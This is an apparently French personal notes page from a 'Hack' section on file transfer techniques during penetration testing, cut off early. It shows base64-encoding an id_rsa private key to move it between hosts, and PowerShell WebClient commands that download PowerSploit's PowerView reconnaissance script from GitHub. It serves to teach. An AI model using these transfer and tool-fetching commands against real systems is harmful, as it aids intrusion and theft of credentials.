
<!doctype html>
<html lang="fr" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../telnet/">
      
      
        <link rel="next" href="../../IOS/commande_ios/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.2, mkdocs-material-9.1.21">
    
    
      
        <title>Le transfert de fichier - Mes docs en vrac ( et en cours )</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.eebd395e.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ecc896b0.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue">
  
    
    
      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#le-transfert-de-fichier" class="md-skip">
          Aller au contenu
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="En-tÃªte">
    <a href="../.." title="Mes docs en vrac ( et en cours )" class="md-header__button md-logo" aria-label="Mes docs en vrac ( et en cours )" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Mes docs en vrac ( et en cours )
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Le transfert de fichier
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
          
            
            
            
            <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
            
              <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_4" hidden>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9h-1.9M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69m-9.15 3.96h2.3L12 9l-1.15 3.65Z"/></svg>
              </label>
            
          
            
            
            
            <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="amber" data-md-color-accent="gren"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_2">
            
              <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9v1Z"/></svg>
              </label>
            
          
            
            
            
            <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="green"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_3">
            
              <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_2" hidden>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5Z"/></svg>
              </label>
            
          
            
            
            
            <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="deep-orange"  aria-label="Switch to other mode"  type="radio" name="__palette" id="__palette_4">
            
              <label class="md-header__button md-icon" title="Switch to other mode" for="__palette_3" hidden>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5Z"/></svg>
              </label>
            
          
        </form>
      
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Rechercher" placeholder="Rechercher" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Recherche">
        
        <button type="reset" class="md-search__icon md-icon" title="Effacer" aria-label="Effacer" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initialisation de la recherche
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Mes docs en vrac ( et en cours )" class="md-nav__button md-logo" aria-label="Mes docs en vrac ( et en cours )" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Mes docs en vrac ( et en cours )
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
      
      
      
        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
          Hack
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          Hack
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../nmap/" class="md-nav__link">
        NMAP
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../telnet/" class="md-nav__link">
        telnet
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Le transfert de fichier
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Le transfert de fichier
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table des matiÃ¨res">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table des matiÃ¨res
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#powershell-base64-decode-encode" class="md-nav__link">
    Powershell base64 dÃ©code encode
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-web-powershell" class="md-nav__link">
    TÃ©lÃ©chargements Web PowerShell
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements Web PowerShell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#methode-powershell-downloadfile" class="md-nav__link">
    MÃ©thode PowerShell DownloadFile
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-downloadstring-methode-sans-fichier" class="md-nav__link">
    PowerShell DownloadString - MÃ©thode sans fichier
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-invoke-webrequest" class="md-nav__link">
    PowerShell Invoke-WebRequest
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#erreurs-courantes-avec-powershell" class="md-nav__link">
    Erreurs courantes avec PowerShell
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-smb" class="md-nav__link">
    TÃ©lÃ©chargements SMB
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements SMB">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#creer-le-serveur-smb" class="md-nav__link">
    CrÃ©er le serveur SMB
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#copiez-un-fichier-a-partir-du-serveur-smb" class="md-nav__link">
    Copiez un fichier Ã  partir du serveur SMB
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creez-le-serveur-smb-avec-un-nom-dutilisateur-et-un-mot-de-passe" class="md-nav__link">
    CrÃ©ez le serveur SMB avec un nom d'utilisateur et un mot de passe
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#monter-le-serveur-smb-avec-nom-dutilisateur-et-mot-de-passe" class="md-nav__link">
    Monter le serveur SMB avec nom d'utilisateur et mot de passe
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-ftp" class="md-nav__link">
    TÃ©lÃ©chargements FTP
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements FTP">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#configuration-dun-serveur-ftp-python3" class="md-nav__link">
    Configuration d'un serveur FTP Python3
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#transferer-des-fichiers-a-partir-dun-serveur-ftp-a-laide-de-powershell" class="md-nav__link">
    TransfÃ©rer des fichiers Ã  partir d'un serveur FTP Ã  l'aide de PowerShell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creer-un-fichier-de-commande-pour-le-client-ftp-et-telecharger-le-fichier-cible" class="md-nav__link">
    CrÃ©er un fichier de commande pour le client FTP et tÃ©lÃ©charger le fichier cible
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell-base64-encode-decode" class="md-nav__link">
    PowerShell Base64 Encode &amp; Decode
  </a>
  
    <nav class="md-nav" aria-label="PowerShell Base64 Encode & Decode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#encoder-le-fichier-a-laide-de-powershell" class="md-nav__link">
    Encoder le fichier Ã  l'aide de PowerShell
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-web-powershell_1" class="md-nav__link">
    TÃ©lÃ©chargements Web PowerShell
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements Web PowerShell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#installation-dun-serveur-web-configure-avec-telechargement" class="md-nav__link">
    Installation d'un serveur Web configurÃ© avec tÃ©lÃ©chargement
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargement-web-powershell-base64" class="md-nav__link">
    TÃ©lÃ©chargement Web PowerShell Base64
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-smb_1" class="md-nav__link">
    TÃ©lÃ©chargements SMB
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements SMB">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#configuration-du-serveur-webdav" class="md-nav__link">
    Configuration du serveur WebDav
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#installation-des-modules-webdav-python" class="md-nav__link">
    Installation des modules WebDav Python
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#utilisation-du-module-webdav-python" class="md-nav__link">
    Utilisation du module WebDav Python
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#connexion-au-partage-webdav" class="md-nav__link">
    Connexion au partage Webdav
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#telechargement-de-fichiers-a-laide-de-smb" class="md-nav__link">
    TÃ©lÃ©chargement de fichiers Ã  l'aide de SMB
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-ftp_1" class="md-nav__link">
    TÃ©lÃ©chargements FTP
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements FTP">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fichier-de-telechargement-powershell" class="md-nav__link">
    Fichier de tÃ©lÃ©chargement PowerShell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creer-un-fichier-de-commande-pour-le-client-ftp-pour-telecharger-un-fichier" class="md-nav__link">
    CrÃ©er un fichier de commande pour le client FTP pour tÃ©lÃ©charger un fichier
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          IOS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          IOS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../IOS/commande_ios/" class="md-nav__link">
        Commande ios
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          Python3
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Python3
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Python3/python/" class="md-nav__link">
        python
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table des matiÃ¨res">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table des matiÃ¨res
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#powershell-base64-decode-encode" class="md-nav__link">
    Powershell base64 dÃ©code encode
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-web-powershell" class="md-nav__link">
    TÃ©lÃ©chargements Web PowerShell
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements Web PowerShell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#methode-powershell-downloadfile" class="md-nav__link">
    MÃ©thode PowerShell DownloadFile
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-downloadstring-methode-sans-fichier" class="md-nav__link">
    PowerShell DownloadString - MÃ©thode sans fichier
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-invoke-webrequest" class="md-nav__link">
    PowerShell Invoke-WebRequest
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#erreurs-courantes-avec-powershell" class="md-nav__link">
    Erreurs courantes avec PowerShell
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-smb" class="md-nav__link">
    TÃ©lÃ©chargements SMB
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements SMB">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#creer-le-serveur-smb" class="md-nav__link">
    CrÃ©er le serveur SMB
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#copiez-un-fichier-a-partir-du-serveur-smb" class="md-nav__link">
    Copiez un fichier Ã  partir du serveur SMB
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creez-le-serveur-smb-avec-un-nom-dutilisateur-et-un-mot-de-passe" class="md-nav__link">
    CrÃ©ez le serveur SMB avec un nom d'utilisateur et un mot de passe
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#monter-le-serveur-smb-avec-nom-dutilisateur-et-mot-de-passe" class="md-nav__link">
    Monter le serveur SMB avec nom d'utilisateur et mot de passe
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-ftp" class="md-nav__link">
    TÃ©lÃ©chargements FTP
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements FTP">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#configuration-dun-serveur-ftp-python3" class="md-nav__link">
    Configuration d'un serveur FTP Python3
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#transferer-des-fichiers-a-partir-dun-serveur-ftp-a-laide-de-powershell" class="md-nav__link">
    TransfÃ©rer des fichiers Ã  partir d'un serveur FTP Ã  l'aide de PowerShell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creer-un-fichier-de-commande-pour-le-client-ftp-et-telecharger-le-fichier-cible" class="md-nav__link">
    CrÃ©er un fichier de commande pour le client FTP et tÃ©lÃ©charger le fichier cible
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell-base64-encode-decode" class="md-nav__link">
    PowerShell Base64 Encode &amp; Decode
  </a>
  
    <nav class="md-nav" aria-label="PowerShell Base64 Encode & Decode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#encoder-le-fichier-a-laide-de-powershell" class="md-nav__link">
    Encoder le fichier Ã  l'aide de PowerShell
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-web-powershell_1" class="md-nav__link">
    TÃ©lÃ©chargements Web PowerShell
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements Web PowerShell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#installation-dun-serveur-web-configure-avec-telechargement" class="md-nav__link">
    Installation d'un serveur Web configurÃ© avec tÃ©lÃ©chargement
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargement-web-powershell-base64" class="md-nav__link">
    TÃ©lÃ©chargement Web PowerShell Base64
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-smb_1" class="md-nav__link">
    TÃ©lÃ©chargements SMB
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements SMB">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#configuration-du-serveur-webdav" class="md-nav__link">
    Configuration du serveur WebDav
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#installation-des-modules-webdav-python" class="md-nav__link">
    Installation des modules WebDav Python
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#utilisation-du-module-webdav-python" class="md-nav__link">
    Utilisation du module WebDav Python
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#connexion-au-partage-webdav" class="md-nav__link">
    Connexion au partage Webdav
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#telechargement-de-fichiers-a-laide-de-smb" class="md-nav__link">
    TÃ©lÃ©chargement de fichiers Ã  l'aide de SMB
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#telechargements-ftp_1" class="md-nav__link">
    TÃ©lÃ©chargements FTP
  </a>
  
    <nav class="md-nav" aria-label="TÃ©lÃ©chargements FTP">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fichier-de-telechargement-powershell" class="md-nav__link">
    Fichier de tÃ©lÃ©chargement PowerShell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creer-un-fichier-de-commande-pour-le-client-ftp-pour-telecharger-un-fichier" class="md-nav__link">
    CrÃ©er un fichier de commande pour le client FTP pour tÃ©lÃ©charger un fichier
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="le-transfert-de-fichier">Le transfert de fichier</h1>
<h2 id="powershell-base64-decode-encode">Powershell base64 dÃ©code encode</h2>
<p>Check de la clÃ© ssh en hash md5</p>
<pre><code class="language-sh">admin@pc[/pc]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
</code></pre>
<p>Encodage de la clÃ© en base64</p>
<pre><code class="language-sh">&gt;admin@pc[/pc]$ cat id_rsa |base64 -w 0;echo
&gt;
&gt;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
</code></pre>
<p>Nous pouvons copier ce contenu et le coller dans une borne Windows PowerShell et utiliser certaines fonctions PowerShell pour le dÃ©coder.</p>
<pre><code class="language-powershell">&gt;PS C:\pc&gt; [IO.File]::WriteAllBytes(&quot;C:\Users\Public\id_rsa&quot;, [Convert]::FromBase64String(&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
</code></pre>
<p>Enfin, nous pouvons confirmer si le fichier a Ã©tÃ© transfÃ©rÃ© avec succÃ¨s Ã  l'aide du Get-FileHash cmdlet, qui fait la mÃªme chose que md5sum fait.</p>
<pre><code class="language-powershell">PS C:\pc&gt; Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                            Path
---------       ----                            ----
MD5      4E301756A07DED0A2DD6953ABF015278        C:\Users\Public\id_rsa
</code></pre>
<h2 id="telechargements-web-powershell">TÃ©lÃ©chargements Web PowerShell</h2>
<p>PowerShell propose de nombreuses options de transfert de fichiers.</p>
<p>Dans n'importe quelle version de PowerShell, le <a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0">System.Net.WebClient</a> peut Ãªtre utilisÃ©e pour tÃ©lÃ©charger un fichier sur HTTP, HTTPS ou FTP. Les Ã©lÃ©ments suivants dÃ©crivent les mÃ©thodes WebClient pour tÃ©lÃ©charger des donnÃ©es Ã  partir d'une ressource:</p>
<table>
<thead>
<tr>
<th>Method</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>OpenRead</td>
<td>Renvoie les donnÃ©es d'une ressource en tant que Flux.</td>
</tr>
<tr>
<td>OpenReadAsync</td>
<td>Renvoie les donnÃ©es d'une ressource sans bloquer le thread appelant.</td>
</tr>
<tr>
<td>DownloadData</td>
<td>TÃ©lÃ©charge les donnÃ©es d'une ressource et renvoie un tableau d'octets.</td>
</tr>
<tr>
<td>DownloadDataAsync</td>
<td>TÃ©lÃ©charge les donnÃ©es d'une ressource et renvoie un tableau d'octets sans bloquer le thread appelant.</td>
</tr>
<tr>
<td>DownloadFile</td>
<td>TÃ©lÃ©charge les donnÃ©es d'une ressource vers un fichier local.</td>
</tr>
<tr>
<td>DownloadFileAsync</td>
<td>TÃ©lÃ©charge les donnÃ©es d'une ressource vers un fichier local sans bloquer le thread appelant.</td>
</tr>
<tr>
<td>DownloadString</td>
<td>TÃ©lÃ©charge une chaÃ®ne Ã  partir d'une ressource et renvoie une chaÃ®ne.</td>
</tr>
<tr>
<td>DownloadStringAsync</td>
<td>TÃ©lÃ©charge une chaÃ®ne Ã  partir d'une ressource sans bloquer le fil appelant.</td>
</tr>
</tbody>
</table>
<h3 id="methode-powershell-downloadfile">MÃ©thode PowerShell DownloadFile</h3>
<p>Nous pouvons spÃ©cifier le nom de la classe Net.WebClient et la mÃ©thode DownloadFile avec les paramÃ¨tres correspondant Ã  l'URL du fichier cible Ã  tÃ©lÃ©charger et le nom du fichier de sortie.</p>
<pre><code class="language-powershell">PS C:\pc&gt; # Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')
PS C:\pc&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\pc&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')
PS C:\pc&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
</code></pre>
<h3 id="powershell-downloadstring-methode-sans-fichier">PowerShell DownloadString - MÃ©thode sans fichier</h3>
